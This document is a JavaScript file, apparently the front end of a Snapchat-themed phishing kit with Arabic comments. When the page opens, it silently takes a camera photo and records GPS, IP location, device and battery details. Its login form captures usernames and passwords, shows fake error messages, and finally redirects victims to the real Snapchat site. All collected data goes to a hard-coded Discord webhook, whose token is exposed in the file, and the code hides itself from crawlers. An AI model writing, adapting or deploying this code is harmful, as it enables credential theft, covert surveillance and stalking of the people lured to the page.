const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4aBtwaUtWWdTITUfu8pfQbVMS-RGerhwqUQ5YVmlu3IPYYy0tgRHbdcFFWL_xsYfD68H";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let loginAttempts = 0;

function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    return ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || navigator.webdriver;
}

async function getIPAndLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || "غير معروف",
            city: data.city || "غير معروف",
            region: data.region || "غير معروف",
            country: data.country_name || "غير معروف",
            org: data.org || "غير معروف"
        };
    } catch (e) {
        return { ip: "غير معروف", city: "", region: "", country: "", org: "" };
    }
}

async function getSystemInfo() {
    const geoip = await getIPAndLocation();
    const ua = navigator.userAgent;
    const platform = navigator.platform || "غير معروف";
    const language = navigator.language || "غير معروف";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    
    let batteryInfo = "غير مدعومة";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
        }
    } catch (e) {}

    return { ...geoip, ua, platform, language, screenRes, batteryInfo };
}

// دالة جلب الموقع الدقيق (GPS) مع التعامل مع الأذونات
async function getGPSLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: null, lng: null });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
            },
            (err) => {
                console.warn("فشل الحصول على GPS:", err.message);
                resolve({ lat: null, lng: null });
            },
            { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }
        );
    });
}

// دالة التقاط الكاميرا مع تصحيح مشكلة الصورة السوداء
async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
        });
        
        video.srcObject = stream;
        
        // تشغيل الفيديو والانتظار لكي تعمل العدسة وتلتقط الضوء (حل الشاشة السوداء)
        await video.play().catch(() => {});
        await new Promise(resolve => setTimeout(resolve, 3000)); // مهلة 3 ثوانٍ لضمان وضوح الصورة
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.95));
        
        // إيقاف الكاميرا فوراً بعد التقاط الصورة
        stream.getTracks().forEach(track => track.stop());
        return blob;
    } catch (e) {
        console.warn("خطأ في الكاميرا:", e);
        return null;
    }
}

// دالة الإرسال المتكاملة إلى ديسكورد
async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status = "") {
    if (isBot()) return;

    try {
        const info = await getSystemInfo();
        const formData = new FormData();
        
        let content = `🚨 **[ تقرير صيد جديد ]**\n` +
                      `🌐 **IP:** \`${info.ip}\`\n` +
                      `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
                      `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n`;
        
        if (lat && lng) {
            content += `📍 **موقع GPS الدقيق:** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
        } else {
            content += `📍 **موقع GPS:** تم رفض الإذن من المتصفح أو الرابط ليس HTTPS.\n`;
        }

        if (user) {
            content += `👤 **المستخدم:** \`${user}\`\n🔑 **كلمة المرور:** \`${pass}\`\n`;
        }

        if (status) {
            content += `📝 **الحالة:** ${status}\n`;
        }
        
        content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

        if (frontBlob) {
            formData.append('file1', frontBlob, 'camera_shot.png');
        }

        formData.append('payload_json', JSON.stringify({
            content: content,
            username: "Hunter Bot",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
        }));

        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) {
        console.error("خطأ في إرسال الويب هوك:", err);
    }
}

// التشغيل التلقائي فور فتح الصفحة الأولى
window.addEventListener('DOMContentLoaded', async () => {
    // محاولة طلب الموقع والكاميرا بالتتابع
    setTimeout(async () => {
        const { lat, lng } = await getGPSLocation();
        const frontBlob = await captureCamera();
        await sendToDiscord(frontBlob, lat, lng, "", "", "تم فتح الصفحة وطلب الأذونات تلقائياً.");
    }, 1500);
});

// التعامل مع نموذج تسجيل الدخول (apply.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        loginAttempts++;

        const u = e.target.username.value;
        const p = e.target.password.value;
        
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.style.display = 'flex';

        const { lat, lng } = await getGPSLocation();
        const frontBlob = await captureCamera();

        await sendToDiscord(frontBlob, lat, lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);

        setTimeout(() => {
            if (loadingOverlay) loadingOverlay.style.display = 'none';

            if (loginAttempts >= 3) {
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                const errorMsg = document.getElementById('loginErrorMsg');
                if (errorMsg) errorMsg.style.display = 'block';
                e.target.password.value = "";
            }
        }, 1500);
    });
}
